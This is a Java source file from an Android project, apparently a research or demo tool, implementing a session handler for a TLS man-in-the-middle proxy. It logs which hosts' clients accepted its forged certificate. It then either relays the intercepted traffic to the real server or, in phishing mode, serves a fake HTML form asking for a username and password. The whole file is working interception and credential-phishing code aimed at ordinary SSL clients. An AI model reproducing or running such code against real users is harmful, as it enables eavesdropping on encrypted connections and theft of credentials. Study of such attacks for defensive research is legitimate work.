package at.iaik.aha;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketException;
import java.util.Arrays;
import java.util.List;

import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import android.util.Log;


public class mySession implements Runnable {

	private Socket socket_;
	private String TAG = "mySession.java";
	private String port_;
	private BufferedReader br_;
	private OutputStream os_;
	
	boolean hackit_;
	
	final static List<String> GIVE_ME_YOUR_CREDS = Arrays.asList(
		       "<html>\r\n",
		       "<head>\r\n",
		       "<title>Trust me</title>\r\n",
		       "</head>\r\n",
		       "<body>\r\n",
		       "<h1><span style=\"background-color:white\">Can I haz credentials please :-)</span></h1>\r\n",
		       "<form action=\"input_text_tabelle.htm\">\r\n",
		         "<table border=\"0\" width=\"100%\" cellpadding=\"0\" cellspacing=\"4\">\r\n",
		         "  <tr>\r\n",
		         "    <td align=\"right\"><span style=\"background-color:white\">Username:</span></td>\r\n",
		         "    <td><input name=\"uname\" type=\"text\" size=\"25\" maxlength=\"30\"></td>\r\n",
		         "  </tr>\r\n",
		         "  <tr>\r\n",
		         "    <td align=\"right\"><span style=\"background-color:white\">Password:</span></td>\r\n",
		         "    <td><input name=\"pw\" type=\"text\" size=\"25\" maxlength=\"40\"></td>\r\n",
		         "  </tr>\r\n",
		        " </table>\r\n",
		       "</form>\r\n",
		       "</body>\r\n",
		       "</html>\r\n");

	public mySession(Socket s, boolean phishing) throws SocketException {
		socket_ = s;
		port_ = String.valueOf(s.getPort());
		Log.i(TAG, "[" + port_ + "] New Session");
		hackit_ = phishing;
	}

	public void run() {
		try {
			br_ = new BufferedReader(new InputStreamReader(socket_.getInputStream()));
			os_ = socket_.getOutputStream();
			os_.flush();
			socket_.setSoTimeout(3000);
			boolean hasHost = false;
			String host = null;// = null;
			
			String read = br_.readLine();
			String totalTraffic = "";
			if(read != null) {
				while (read != null && br_.ready()) {
					if(read.startsWith("Host:") || read.startsWith("From:")){ 
						host = (read.split(":")[1]).trim();
						hasHost = true;
					}
					totalTraffic += read + "\n";
					read = br_.readLine();
				}
				
				String msg = "[" + port_ + "]  acceppted our cert for \n" + host; 
				Log.e(TAG, msg);
				Main.sendLogMsg(msg);
				
				if(Main.newHost(host))
					Main.addLogToList(msg);
				
				if(hasHost)
				{
					if(hackit_) {
						ObjectOutputStream out = new ObjectOutputStream(os_);
						String toSend = "";
						for (String s:GIVE_ME_YOUR_CREDS){
							toSend += s;
						}
						//Log.i(TAG, toSend);
						out.writeUTF(toSend);
						out.flush();
						os_.flush();
					} else {
						Log.i(TAG, "HOST FOUND");
						Thread t = new Thread(new mySSLHandshake(host, totalTraffic, socket_.getInputStream(), socket_.getOutputStream()));	//end runnable / thread
						t.setDaemon(true);
						t.start();
						Log.i(TAG, "Connection to Server started");
						t.join();
						Log.i(TAG, "Connection to Server finished");
					} //end hackit
				}	//end if
				else
					Main.addLogToList("noHost");
				
			} else {
//				Log.i(TAG, "[" + port_ + "] nothing read");
//				Main.sendLogMsg("[" + port_ + "] nothing read");
			}

    	} catch (SSLHandshakeException e) {
    		String msg = "[" + port_ + "] HandShake failed: " + e.getMessage();
    		Log.i(TAG , msg);
    		Main.sendLogMsg(msg);
    	} catch (SSLException e) {
    		String msg = "[" + port_ + "] other SSLException: " + e.toString();
    		Log.i(TAG , msg);
    		Main.sendLogMsg(msg);
    	} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
		try { if (os_!=null) os_.close(); if(br_!=null) br_.close(); socket_.close();} 
			catch (IOException e1) {}
		}
		try { if (os_!=null) os_.close(); if(br_!=null) br_.close(); socket_.close();} 
		catch (IOException e1) {}
	}

	@Override
	protected void finalize() throws Throwable {
		Log.i(TAG, "[" + port_ + "] finalize()");
		if(socket_.isConnected())
			socket_.close();
		super.finalize();
	}

}